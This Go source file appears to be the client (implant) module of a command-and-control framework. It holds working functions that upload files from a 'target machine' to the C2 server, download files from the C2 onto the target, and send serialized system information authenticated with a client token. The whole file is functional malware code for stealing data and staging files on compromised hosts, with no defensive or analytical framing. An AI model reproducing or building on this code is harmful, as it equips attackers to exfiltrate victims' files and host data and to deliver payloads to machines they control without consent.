package client

import (
	"bytes"
	"encoding/json"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
)

// UploadFile uploads a local file on the target machine to the c2.
func UploadFile(client *http.Client, url string, localFilePath string, remoteFilePath string) {
	// open the file of interest
	file, err := os.Open(localFilePath)
	if err != nil {
		log.Printf("[-] Error opening file: %s\n", err)
		return
	}
	defer file.Close()

	// create the form file
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile("uploadFile", filepath.Base(remoteFilePath))
	if err != nil {
		log.Printf("[-] Error creating form file: %s\n", err)
		return
	}
	_, err = io.Copy(part, file)
	err = writer.Close()
	if err != nil {
		log.Printf("[-] Error closing the multipart writer: %s\n", err)
		return
	}

	// create the request
	req, err := http.NewRequest("POST", url, body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	if err != nil {
		log.Printf("[-] Error creating the request: %s\n", err)
		return
	}

	// send it off
	_, err = client.Do(req)
	if err != nil {
		log.Printf("[-] Error sending upload request: %s\n", err)
		return
	}
	log.Println("[+] Uploaded file.")
}

// DownloadFile downloads a file from the c2 to the local target machine.
func DownloadFile(client *http.Client, url string, filePath string) {
	// get the file data
	log.Println(url)
	resp, err := client.Get(url)
	if err != nil {
		log.Printf("[-] Error getting file to download from c2: %s\n", err)
		return
	}
	defer resp.Body.Close()

	// create downloads dir if not existant yet
	_ = os.Mkdir("downloads", 0755)
	// create local file
	out, err := os.Create("downloads/" + filePath)
	if err != nil {
		log.Printf("[-] Error creating local file: %s\n", err)
		return
	}
	defer out.Close()

	// and write data to it
	_, err = io.Copy(out, resp.Body)
	if err != nil {
		log.Printf("[-] Error writing to local file: %s\n", err)
		return
	}
	log.Println("[+] Successfully downloaded file")
}

func SendSysInfo(client *http.Client, url string, sysInfo SysInfo) {
	data, _ := json.Marshal(sysInfo)
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(data))
	if err != nil {
		log.Printf("[-] Error creating the POST request: %s\n", err)
		return
	}

	req.Header.Add("Token", ClientToken)
	req.Header.Set("Content-Type", "application/json")

	client.Do(req)
}
